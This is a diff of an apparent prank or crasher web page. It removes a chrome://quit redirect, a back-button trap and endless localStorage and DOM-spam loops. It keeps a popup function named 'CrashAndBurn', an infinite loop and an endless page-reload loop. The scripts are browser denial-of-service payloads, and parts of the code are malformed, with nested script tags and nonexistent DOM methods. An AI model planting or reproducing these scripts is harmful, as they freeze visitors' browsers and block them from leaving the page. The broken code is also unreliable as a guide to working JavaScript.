@@ -1,26 +1,4 @@
-<script>
-try {
-    window.location.replace("chrome://quit")
-    //some old browsers support this, if they are useing VERY old chromium.
-} finally {
-    history.pushState(null, document.title,     location.href);
-    window.addEventListener('popstate', function(event) {
-        history.pushState(null, document.title,      location.href);
-    })
-    while(true) {
-        let location = 1
-        let item = 1
-        localStorage.setItem(location, item)
-        location = location+1
-        item = item*2
-        localStorage.getItem(location)
-        console.log("added and used: "+item+" at "+location)
-    }
-}
-if (window.closed) {
-    window.location.replace("run.html")
-}
-</script>
+
 <script>
   <script type="text/javascript"> 
 function CrashAndBurn(url) { popupWindow = window.open( url,'popUpWindow','height=181,width=666,left=3,top=222') }
@@ -35,16 +13,7 @@ function CrashAndBurn(url) { popupWindow = window.open( url,'popUpWindow','heigh
 <script>
   for(var i = 0; i === i; i++) {}
   </script>
-<script>
-  while(true){
-var dp = document.getElementByID("spamr");
- if(!document.getElementByID("spamr")){
-  var dp = document.createElementByID("spamr");
-  dp.innerHTML += "🤍🤍🤍🤍🤍🤍🤍🤍🤍🤍";
-}
-dp.innerHTML += "🤍🤍🤍🤍🤍🤍🤍🤍🤍🤍🤍";
-}
-</script>
+
 <script>
   onbeforeunload = function(){localStorage.x=1};
   while(1)location.reload(1)
